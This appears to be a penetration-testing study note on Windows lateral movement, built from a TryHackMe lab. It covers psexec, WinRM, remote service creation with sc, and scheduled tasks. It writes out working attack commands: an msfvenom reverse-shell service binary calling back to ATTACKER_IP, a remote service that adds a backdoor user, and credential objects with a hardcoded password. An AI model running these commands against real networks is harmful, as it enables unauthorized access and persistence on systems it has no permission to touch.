# Windows Network Lateral Movement
The articles [[Network-Protocols]], [[Network-Services]] and [[Windows-Networking]] will provide theory background information, while [[Windows-Networking-Commands]], [[Windows-CLI-cmd]] ,[[SMB-Recon-Cheatsheet]] and [[RPCClient-Cheatsheet]] articles will provide command cheatsheet referal.

## MSFVenom
[[MSFvenom-Payloads]] for exe-service
```bash
 msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

## Spawning Process Remotely
See [[Windows-Processes]] for more information on Service and Processes. [Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) of Sysinternal Tools is used by Admins so will less likely blocked by Firewall. See [[Sysinternals-Hub]] for more Sysinternals. Requires:
1. Port 445/TCP (SMB) 
1. Requires: `Administrator Group` Membership

`psexec` connects to `Admin$` share and uploads a service binary with the name  `psexesvc.exe` then connects to service control manager to create and run a service named `PSEXESVC` and associates the service binary with `C:\Windows\psexesvc.exe`, finally creating named pipes to handles Std(in/out/err).

```powershell
psexec64.exe \\$IP -u Administrator -p ******** -i cmd.exe
```

It is also an Impacket tool see [[Impacket-Cheatsheet]]

## Remote Process Creation Using WinRM
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely, with most Windows Server installations have WinRM enabled by default.

1. Ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
2. Requires: `Remote Management Users Group` Membership

Connect to remote powershell session:
```powershell
winrs.exe -u:Administrator -p:********** -r:$target cmd
```

[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting) suggests that you can accomplish a similar thing with a Powershell by creating a PSCredential object:
```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Enter-PSSession cmdlet to create and interactive session:
```powershell
Enter-PSSession -Computername $TARGET -Credential $credential
```

Using Invoke-Command cmdlet we can run ScriptBlocks remote via WinRM. 
```powershell
Invoke-Command -Computername $TARGET -Credential $credential -ScriptBlock {whoami}
```

## Remote Service Creation with `sc`
1. Ports:  
	1. 135/TCP, 49152-65535/TCP (DCE/RPC)
	2. 445/TCP (RPC over SMB Named Pipes)
	3. 139/TCP (RPC over SMB Named Pipes)
2.  Requires: `Administrator Group` Membership

Windows Ser services execute a command when started, `sc` we create a service on a remote host and attempt to connect to the Service Control Manager(SVCCTL) remote service program through RPC in multiple ways.
1. DCE/RPC `Request -> EMP(port 135) -> Response=SVCCTL is <dynamic port>` Then `RPC Bind to SVCCTL on <dynamic port>`
2. If the above failes `sc` connects to port `Named pipe <\pipe\svcctl\>` on port 445 (SMB or 139 ()

```powershell
sc.exe \\$TARGET create Badbadservice binPath= "net user friend Pass123 /add" start= auto
sc.exe \\$TARGET start Badbadservice
# To Stop and Delete service 
sc.exe \\$TARGET stop Badbadservice
sc.exe \\$TARGET delete Badbadservice
```

## Creating Scheduled Tasks Remotely
`schtasks` can create tasks remotely with `/s` flag.
```powershell
schtasks /s $TARGET /RU "SYSTEM" /create /tn "Badtask" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s $TARGET /run /TN "Badtask" 
# To delete
schtasks /S $TARGET /TN "Badtask" /DELETE /F
```

## Impacket - dccomexec.py
[[Impacket-Cheatsheet]]

## Pass the ccache
[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)



## References
[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting)
[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) 
[Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)